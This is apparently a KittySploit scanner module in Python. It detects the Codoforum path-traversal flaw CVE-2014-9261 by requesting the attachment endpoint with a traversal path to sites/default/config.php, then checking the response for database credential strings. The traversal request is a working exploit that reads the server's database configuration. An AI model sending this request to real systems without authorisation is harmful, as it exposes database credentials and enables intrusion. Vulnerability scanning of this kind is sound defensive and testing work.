#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Codoforum serve/attachment arbitrary file download (CVE-2014-9261)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Codoforum - Attachment Path Traversal Detection (CVE-2014-9261)',
        'description': (
            'Detects CVE-2014-9261 by requesting index.php?u=serve/attachment&path= '
            'traversal to sites/default/config.php.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'codoforum', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-9261',
        ],
        'cve': 'CVE-2014-9261',
    }

    def run(self):
        trav = '../../../../../sites/default/config.php'
        for base in ('', '/codoforum', '/forum'):
            path = f'{base}/index.php?u=serve/attachment&path={trav}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r:
                continue
            body = r.text or ''
            if 'get_codo_db_conf' in body and (
                'database' in body.lower() or 'username' in body.lower() or 'password' in body.lower()
            ):
                self.set_info(
                    severity='high',
                    reason='Codoforum attachment LFI (CVE-2014-9261)',
                    path=f'{base}/index.php',
                )
                return True
        return False
